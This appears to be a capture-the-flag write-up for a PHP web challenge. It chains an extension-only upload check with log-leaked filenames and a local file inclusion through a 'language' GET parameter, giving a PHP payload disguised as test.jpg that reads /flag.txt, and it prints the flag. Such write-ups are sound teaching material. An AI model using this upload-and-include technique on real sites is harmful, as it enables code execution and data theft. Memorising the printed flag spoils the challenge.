Endpoint to upload files

```php
<?
    $uniqueName = uniqid() . "_$originalName";
    $uploadPath = $uploadDir . $uniqueName;

    if (in_array($fileExtension, $allowedExtensions)) {
        if (move_uploaded_file($fileTmpPath, $uploadPath)) {
            logEvent("Uploaded file: $uniqueName");
...
?>
```

As you can see here, the finale path will be constructed with `$uniqueName`, so we have to get a way to know generated file path and that could be found in 

```php
<?$logFile = 'logs/site_log.txt';

/**
 * Logs a message to the centralized log file.
 *
 * @param string $message The message to log.
 */
function logEvent($message) {
    global $logFile;

    if (!is_dir(dirname($logFile))) {
        mkdir(dirname($logFile), 0755, true);
    }

    $timestamp = date('[Y-m-d H:i:s]');
    $formattedMessage = "$timestamp $message\n";

    file_put_contents($logFile, $formattedMessage, FILE_APPEND);
}
?>
```

Payload file with any name that bypass the validation (`$allowedExtensions = ['jpg', 'png', 'gif'];`) like test.jpg with content

```php
<?php 
  $file = '/flag.txt'; 
  $content = file_get_contents($file); 
  echo $content; 
?>

```

Upload your file and go to `conspiracy` page, because there we can `include` that file (it will be executed)


```php
<?
$baseDir = realpath('/var/www/html');

$language = $_GET['language'] ?? 'languages/english.php';

logEvent("Language parameter accessed: $language");

$filePath = realpath($language);

ob_start();

if ($filePath && strpos($filePath, $baseDir) === 0 && file_exists($filePath)) {
    include($filePath); // execution point
} else {
    echo "<p>File not found or access denied: " . htmlspecialchars($language) . "</p>";
    logEvent("Access denied or file not found for: $language");
}
$languageContent = ob_get_clean();
?>
```

we can abuse this GET parameter with `/var/www/html/` + your filename from logs


`flag{6558608db040d1c64358ad536a8e06c6}`
